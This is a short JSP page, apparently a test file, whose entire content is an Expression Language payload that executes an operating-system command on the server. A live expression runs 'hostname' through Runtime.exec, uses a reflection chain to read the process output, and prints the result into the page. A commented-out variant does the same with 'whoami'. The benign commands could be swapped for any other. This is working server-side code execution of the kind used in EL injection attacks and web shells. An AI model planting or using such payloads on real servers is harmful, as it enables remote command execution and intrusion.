<%@ page language="java" contentType="text/html; charset=utf-8" pageEncoding="utf-8" %>

<%-- 测试用 --%>

<%--${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"whoami")}--%>

${pageContext.setAttribute("inputStream", Runtime.getRuntime().exec("hostname").getInputStream());Thread.sleep(1000);pageContext.setAttribute("inputStreamAvailable", pageContext.getAttribute("inputStream").available());pageContext.setAttribute("byteBufferClass", Class.forName("java.nio.ByteBuffer"));pageContext.setAttribute("allocateMethod", pageContext.getAttribute("byteBufferClass").getMethod("allocate", Integer.TYPE));pageContext.setAttribute("heapByteBuffer", pageContext.getAttribute("allocateMethod").invoke(null, pageContext.getAttribute("inputStreamAvailable")));pageContext.getAttribute("inputStream").read(pageContext.getAttribute("heapByteBuffer").array(), 0, pageContext.getAttribute("inputStreamAvailable"));pageContext.setAttribute("byteArrType", pageContext.getAttribute("heapByteBuffer").array().getClass());pageContext.setAttribute("stringClass", Class.forName("java.lang.String"));pageContext.setAttribute("stringConstructor", pageContext.getAttribute("stringClass").getConstructor(pageContext.getAttribute("byteArrType")));pageContext.setAttribute("stringRes", pageContext.getAttribute("stringConstructor").newInstance(pageContext.getAttribute("heapByteBuffer").array()));pageContext.getAttribute("stringRes")}